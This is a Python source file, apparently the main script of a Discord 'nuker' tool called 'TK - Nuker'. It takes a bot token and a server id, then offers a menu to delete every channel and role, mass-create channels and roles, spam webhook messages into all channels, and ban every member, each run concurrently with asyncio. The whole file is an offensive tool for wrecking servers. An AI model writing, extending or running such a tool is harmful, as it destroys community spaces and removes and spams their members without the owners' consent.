import asyncio, os, pyfiglet
from rgbprint import gradient_print
from Functions import *
from modules.Banall import *
from modules.webhookspamm import *
from modules.createchannel import *
from modules.createroles import *
from modules.deletechannels import *
from modules.deleteroles import *

CLEAR_COMMAND = "cls" if os.name == "nt" else "clear"
MENU_OPTIONS = {
    "1": "Delete channels",
    "2": "Create channels",
    "3": "Delete roles",
    "4": "Create roles",
    "5": "Webhook Spam",
    "6": "Ban all",
    "7": "CHAOS (not here yet!)"
}

def credits():
    os.system(CLEAR_COMMAND)
    asciiart()

def asciiart():
    figlet = pyfiglet.Figlet(font="slant")
    gradient_print(figlet.renderText("TK - Nuker"), start_color="purple", end_color="blue")
    gradient_print("Credits: @traili, @mehhovcki and Naps (@laura_lol21)\n", start_color="purple", end_color="blue")

def display_menu():
    gradient_print("\n".join([f"[{key}] {value}" for key, value in MENU_OPTIONS.items()]), start_color="yellow", end_color="green")

async def main():
    credits()
    token = input("Bot token: ")
    guild = input("Guild id: ")
    credits()

    headers = {"Authorization": f"Bot {token}"}

    while True:
        display_menu()
        choice = input("")

        if choice not in MENU_OPTIONS:
            print("not a valid choice")
            continue

        if choice == "1":
            channels = await get_channels(int(guild), headers)
            await asyncio.gather(*[deletechannels(int(guild), channel, headers) for channel in channels])
        elif choice == "2":
            name = input("Name: ")
            amount = int(input("Amount: "))
            await asyncio.gather(*[createchannels(int(guild), name, headers) for _ in range(amount)])
        elif choice == "3":
            roles = await getroles(int(guild), headers)
            await asyncio.gather(*[deleteroles(int(guild), role, headers) for role in roles])
        elif choice == "4":
            name = input("Name: ")
            await asyncio.gather(createroles(int(guild), name, headers))
        elif choice == "5":
            message = input("Message: ")
            amount = int(input("Amount: "))
            channels = await get_channels(int(guild), headers)
            await asyncio.gather(*[webhookspamm(int(channel), amount, message, headers) for channel in channels])
        elif choice == "6":
            members = await get_members(int(guild), headers)
            await asyncio.gather(*[ban_members(int(guild), member, headers) for member in members])
        elif choice == "7":
            print("Soon")

        await asyncio.sleep(1)
        credits()

asyncio.run(main())
